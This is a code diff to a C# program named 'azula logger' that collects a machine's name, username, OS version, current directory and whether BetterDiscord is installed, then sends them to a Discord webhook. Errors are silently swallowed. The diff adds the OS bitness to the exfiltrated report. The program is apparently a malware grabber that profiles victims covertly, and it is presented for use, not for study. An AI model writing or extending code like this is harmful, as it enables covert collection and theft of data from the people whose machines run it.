@@ -20,6 +20,8 @@ namespace azula_logger
             string PCName = Environment.MachineName;
             string UserName = Environment.UserName;
             string OSVersion = (Environment.OSVersion.ToString());
+            string Bit = Environment.Is64BitOperatingSystem.ToString();
+
             string BetterDiscordDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\BetterDiscord";
             //checking if the person has betterdiscord 
             if (Directory.Exists(BetterDiscordDir))
@@ -31,7 +33,7 @@ namespace azula_logger
                 BetterDiscordI = "false";
             }
             //sending webhook
-            websend.sendDiscordWebhook(webhook, "azula logger", "Name: \n" + PCName + "\n\nUsername: \n" + UserName + "\n\nOS Version: \n" + OSVersion + "\n\nBetterDiscord: \n" + BetterDiscordI + "\n\nCurrent dir: \n" + CurrentDir + "\n -------------------------", image);
+            websend.sendDiscordWebhook(webhook, "azula logger", "Name: \n" + PCName + "\n\nUsername: \n" + UserName + "\n\nOS Version: \n" + OSVersion + "\n\nBetterDiscord: \n" + BetterDiscordI + "\n\nCurrent dir: \n" + CurrentDir + "\n\n64BIT Process: \n" + Bit + "\n -------------------------", image);
             }
             catch { }
         }
